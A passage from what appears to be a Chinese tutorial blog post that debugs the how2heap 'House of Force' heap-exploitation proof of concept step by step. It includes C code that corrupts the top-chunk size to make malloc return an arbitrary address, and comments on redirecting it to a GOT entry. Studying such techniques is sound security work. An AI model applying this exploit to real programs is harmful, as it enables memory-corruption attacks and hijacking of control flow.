<span class=\"token string\">&lt;assert.h></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">char</span> bss_var<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"This is a string that we want to overwrite.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nWelcome to the House of Force\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The top chunk is a special chunk. Is the last in memory \"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token string\">\"and is the chunk that will be resized when malloc asks for more space from the os.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nIn the end, we will use this to overwrite a variable at %p.\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Its current value is: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nLet's allocate the first chunk, taking space from the wilderness.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>p1 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The chunk of 256 bytes has been allocated at %p.\\n\"</span><span class=\"token punctuation\">,</span> p1 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n\"</span><span class=\"token punctuation\">,</span> real_size <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token comment\">//----- VULNERABILITY ----</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>ptr_top <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>p1 <span class=\"token operator\">+</span> real_size <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//??</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe top chunk starts at %p\\n\"</span><span class=\"token punctuation\">,</span> ptr_top<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Old size of top chunk %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"New size of top chunk %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token comment\">//------------------------</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n\"</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t   <span class=\"token string\">\"Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n\"</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t   <span class=\"token string\">\"overflow) and will then be able to allocate a chunk right over the desired region.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t * new_top = old_top + nb</pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t * nb = new_top - old_top</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t * req + 2sizeof(long) = new_top - old_top</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t * req = new_top - old_top - 2sizeof(long)</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t * req = dest - old_top - 4*sizeof(long)</pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t */</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> evil_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>bss_var <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>ptr_top<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n\"</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t   <span class=\"token string\">\"we will malloc %#lx bytes.\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">,</span> ptr_top<span class=\"token punctuation\">,</span> evil_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>new_ptr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>evil_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"As expected, the new pointer is at the same place as the old top chunk: %p\\n\"</span><span class=\"token punctuation\">,</span> new_ptr <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token keyword\">void</span><span class=\"token operator\">*</span> ctr_chunk <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow, the next chunk we overwrite will point at our target buffer.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"malloc(100) => %p!\\n\"</span><span class=\"token punctuation\">,</span> ctr_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now, we can finally overwrite that value:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... old string: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... doing strcpy overwrite with \\\"YEAH!!!\\\"...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>ctr_chunk<span class=\"token punctuation\">,</span> <span class=\"token string\">\"YEAH!!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"... new string: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>ctr_chunk <span class=\"token operator\">==</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t<span class=\"token comment\">// some further discussion:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n\");</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"This because the main_arena->top pointer is setted to current av->top + malloc_size \"</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t<span class=\"token comment\">//\t\"and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n\");</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n\");</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"The av->top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n\");</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),\"</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token comment\">//\t\"\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n\");</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"The large chunk with evil_size has been allocated here 0x%08x\\n\",p2);</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\\n\",malloc_got_address);</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t<span class=\"token comment\">//fprintf(stderr, \"This last malloc will be served from the remainder code and will return the av->top+8 injected before\\n\");</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个示例是将一个全局变量给复写了，也提到了 <code>This PoC works also with ASLR enabled.But this technique RELRO must be disabled</code>  也就是说如果想要修改 got 表，就不能开启 RELRO</p>\n<h2 id=\"2调试程序-5\"><a class=\"anchor\" href=\"#2调试程序-5\">#</a> 2. 调试程序</h2>\n<h3 id=\"1执行到31行打印区间变量地址\"><a class=\"anchor\" href=\"#1执行到31行打印区间变量地址\">#</a> 1. 执行到 31 行，打印区间变量地址</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nWelcome to the House of Force\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The top chunk is a special chunk. Is the last in memory \"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token string\">\"and is the chunk that will be resized when malloc asks for more space from the os.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nIn the end, we will use this to overwrite a variable at %p.\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Its current value is: %s\\n\"</span><span class=\"token punctuation\">,</span> bss_var<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/8B%605%7BHN%7B_%7D9JVDDAPQ%7D%24INL.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/QW_GHBNDBF9%7BJO4SQ5L94_6.png\" alt=\"\" /></p>\n<p>查看具体值，这里就是我们需要利用本次漏洞改写的地方：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/6383MI4RX2I%40V5937_W1U66.png\" alt=\"\" /></p>\n<h3 id=\"2执行到37行\"><a class=\"anchor\" href=\"#2执行到37行\">#</a> 2. 执行到 37 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nLet's allocate the first chunk, taking space from the wilderness.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>p1 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The chunk of 256 bytes has been allocated at %p.\\n\"</span><span class=\"token punctuation\">,</span> p1 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>申请一个 smallbin，由于现在 bin 中没有 chunk，所以会从 topchunk 上切割出一个，然后输出其起始地址（从 <code>pre_size</code>  开始）这里打印的地址是 <code>0x555555759000</code> <br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/E%40D%29%2847ZXQ2QJ01%7D33%24%5DP19.png\" alt=\"\" /></p>\n<h3 id=\"3执行到41行\"><a class=\"anchor\" href=\"#3执行到41行\">#</a> 3. 执行到 41 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n\"</span><span class=\"token punctuation\">,</span> real_size <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>计算 chunk p1 所占的真实大小（包括头部的 0x10），原本申请的是 0x100</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/VKSEZGAM%29NOZ%60X%259Y%241AQO1.png\" alt=\"\" /></p>\n<h3 id=\"4执行到47行\"><a class=\"anchor\" href=\"#4执行到47行\">#</a> 4. 执行到 47 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span>ptr_top <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>p1 <span class=\"token operator\">+</span> real_size <span class=\"token operator\">-</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//??</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe top chunk starts at %p\\n\"</span><span class=\"token punctuation\">,</span> ptr_top<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>一开始我不明白为什么要减去一个 sizeof (long)，但是在调试上一步时，发现给的 <code>real_size</code>  将 topchunk 的 pre_size 位也算入了进去，所以才要减掉这一部分才刚好是 topchunk 的头部</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/JJXO%7EGTX%257M%7D%7EV%5B%25%7DQJQ5LV.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/U%600R3%7BRB51ARV_5S%600%25YUUF.png\" alt=\"\" /></p>\n<h3 id=\"5执行到52行\"><a class=\"anchor\" href=\"#5执行到52行\">#</a> 5. 执行到 52 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Old size of top chunk %#llx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">long</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr_top <span class=\"token operator\">+</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span> <span class=\"token 